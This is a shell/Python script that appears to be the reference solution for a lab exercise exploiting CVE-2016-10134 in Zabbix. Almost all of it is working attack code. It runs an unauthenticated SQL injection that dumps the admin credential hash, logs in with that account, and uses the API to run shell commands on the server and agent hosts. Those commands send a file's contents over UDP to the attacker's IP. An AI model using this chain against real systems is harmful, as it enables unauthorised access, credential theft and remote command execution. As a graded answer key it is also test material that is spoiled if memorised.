#!/bin/bash
# Reference solution for zabbix-rce (CVE-2016-10134), run on the attacker.
# The CVE is exercised for real: the UNAUTHENTICATED jsrpc.php SQL injection
# (profileIdx2, updatexml error extraction) dumps the admin credential
# material; the admin session then drives Zabbix script execution on the
# server host (execute_on server) and the agent host (execute_on agent,
# via the seeded host interface). Each goal's proof token is read as the
# zabbix service user and beaconed over UDP for pcap corroboration, and the
# chain emits SUBMIT lines per the behavioral-check contract.
set -euo pipefail
python3 - <<'PY'
# the attacker guest is focal (python 3.8): annotations must stay lazy
from __future__ import annotations

import hashlib, json, os, re, socket, time, urllib.parse, urllib.request

WEB = "http://web"
ATT = os.environ["IR_ATTACKER_IP"]

# the stack converges after boot (mysqld readiness gates the zabbix server's
# trapper): wait for the declared surface before driving the chain, so the
# check is honest about its preconditions wherever it runs
def wait_port(host: str, port: int) -> None:
    deadline = time.time() + 240
    while time.time() < deadline:
        try:
            socket.create_connection((host, port), timeout=3).close()
            return
        except OSError:
            time.sleep(5)
    raise SystemExit(f"{host}:{port} never converged")

wait_port("web", 80)
wait_port("server", 10051)

def sqli(expr: str) -> str:
    inj = f"updatexml(0,concat(0x7e,({expr})),0)"
    qs = urllib.parse.urlencode({
        "type": "9", "method": "screen.get", "timestamp": "1",
        "mode": "2", "screenid": "", "groupid": "", "hostid": "0",
        "pageFile": "history.php", "profileIdx": "web.item.graph",
        "profileIdx2": inj, "updateProfile": "true", "period": "3600",
        "stime": "20170101000000", "resourcetype": "17",
    })
    body = urllib.request.urlopen(f"{WEB}/jsrpc.php?{qs}", timeout=30).read().decode(errors="replace")
    m = re.search(r"XPATH syntax error: &#039;~([^&]*)&#039;", body) or re.search(r"XPATH syntax error: '~([^']*)'", body)
    if not m:
        raise SystemExit(f"SQLi extraction failed: {body[:300]}")
    return m.group(1)

# CVE-2016-10134: unauthenticated injection dumps the admin credential hash
alias = sqli("select alias from users where userid=1")
passwd = sqli("select substr(passwd,1,16) from users where userid=1") + \
         sqli("select substr(passwd,17,16) from users where userid=1")
print(f"sqli: dumped {alias} hash {passwd}")
assert passwd == hashlib.md5(b"zabbix").hexdigest(), "unexpected admin hash"

def api(method: str, params: object, auth: str | None = None) -> object:
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    if auth:
        payload["auth"] = auth
    req = urllib.request.Request(
        f"{WEB}/api_jsonrpc.php",
        json.dumps(payload).encode(),
        {"Content-Type": "application/json-rpc"},
    )
    reply = json.loads(urllib.request.urlopen(req, timeout=30).read())
    if "error" in reply:
        raise SystemExit(f"api {method}: {reply['error']}")
    return reply["result"]

auth = api("user.login", {"user": alias, "password": "zabbix"})
hosts = api("host.get", {"filter": {"host": ["Zabbix server"]}}, auth)
hostid = hosts[0]["hostid"]

def rce(execute_on: int, goal: str) -> None:
    cmd = (
        "cat /var/lib/zabbix/.proof_token; "
        "python3 -c \"import socket;s=socket.socket(2,2);"
        "s.sendto(open('/var/lib/zabbix/.proof_token','rb').read(),"
        f"('{ATT}',41414))\""
    )
    script = api("script.create", {
        "name": f"ir-ref-{goal}", "command": cmd,
        "host_access": 3, "execute_on": execute_on, "type": 0,
    }, auth)
    scriptid = script["scriptids"][0]
    try:
        result = api("script.execute", {"scriptid": scriptid, "hostid": hostid}, auth)
        token = str(result["value"]).strip().splitlines()[0].strip()
        print(f"SUBMIT {goal} {token}")
    finally:
        api("script.delete", [scriptid], auth)

rce(1, "execute-server")   # execute_on=1: the Zabbix server host
rce(0, "execute-agent")    # execute_on=0: the agent, via the seeded interface

# rotate the capture chunk so the beacons land in a HARVESTED chunk: tcpdump
# rotates by size and scoring reads only rotated chunks (the refchains
# lesson), so push >1.5 MB of lab traffic after the beacons (CAPTURE_CHUNK_MB
# is 1 in the build and battery contexts)
total = 0
while total < 1_500_000:
    total += len(urllib.request.urlopen(f"{WEB}/index.php", timeout=30).read())
PY
